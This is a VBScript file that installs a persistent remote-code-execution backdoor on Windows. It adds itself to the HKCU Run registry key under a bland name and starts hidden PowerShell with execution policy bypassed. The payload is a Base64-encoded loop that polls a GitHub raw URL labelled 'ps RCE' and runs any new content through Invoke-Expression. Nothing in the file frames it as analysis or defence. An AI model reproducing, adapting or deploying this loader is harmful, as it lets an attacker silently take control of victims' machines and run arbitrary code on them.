Dim shell, targetURL, checkInterval, psCode, encodedCode
Set shell = CreateObject("WScript.Shell")

' ====================================================================
' CONFIGURATION
' ====================================================================
targetURL = "https://raw.githubusercontent.com/aaaaaaaaaad2131213123123belgia/test/refs/heads/main/ps%20RCE"
checkInterval = 5 ' Seconds between checks

' ====================================================================
' POWERSHELL BACKEND ENGINE
' ====================================================================
' Logic: Fetch once to establish baseline ($l), then loop and only 
' execute when fetched content ($c) differs from baseline ($l)
psCode = "$u='" & targetURL & "';$i=" & checkInterval & ";" & _
    "$l=$null;" & _
    "while($l -eq $null){" & _
        "try{$w=Invoke-WebRequest -Uri ($u+'?x='+(Get-Random)) -UseBasicParsing -TimeoutSec 10;" & _
        "if($w.StatusCode -eq 200){$l=$w.Content}}catch{Start-Sleep -Sec 3}" & _
    "};" & _
    "while($true){" & _
        "Start-Sleep -Sec $i;" & _
        "try{$w=Invoke-WebRequest -Uri ($u+'?x='+(Get-Random)) -UseBasicParsing -TimeoutSec 10;" & _
        "if($w.StatusCode -eq 200){" & _
            "$c=$w.Content;" & _
            "if($c -and $c -ne $l){" & _
                "$l=$c;" & _
                "Invoke-Expression $c" & _
            "}" & _
        "}}catch{}" & _
    "}"

encodedCode = Base64Encode(psCode)

' ====================================================================
' REGISTRY PERSISTENCE
' ====================================================================
Dim regPath, scriptPath
regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyBackgroundReceiver"
scriptPath = WScript.ScriptFullName

On Error Resume Next
shell.RegWrite regPath, "wscript.exe //B """ & scriptPath & """", "REG_SZ"
On Error GoTo 0

' ====================================================================
' EXECUTE (Hidden - no window)
' ====================================================================
shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & encodedCode, 0, False

' ====================================================================
' BASE64 ENCODE FUNCTION (Fixed - uses ADODB.Stream)
' ====================================================================
Function Base64Encode(s)
    Dim oXML, oNode
    Set oXML = CreateObject("MSXML2.DOMDocument.3.0")
    Set oNode = oXML.createElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = StringToBinary(s)
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function StringToBinary(s)
    Dim oStream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 2 'Text
    oStream.Mode = 3 'ReadWrite
    oStream.Open
    oStream.Charset = "UTF-16LE"
    oStream.WriteText s
    oStream.Position = 0
    oStream.Type = 1 'Binary
    StringToBinary = oStream.Read
    oStream.Close
    Set oStream = Nothing
End Function
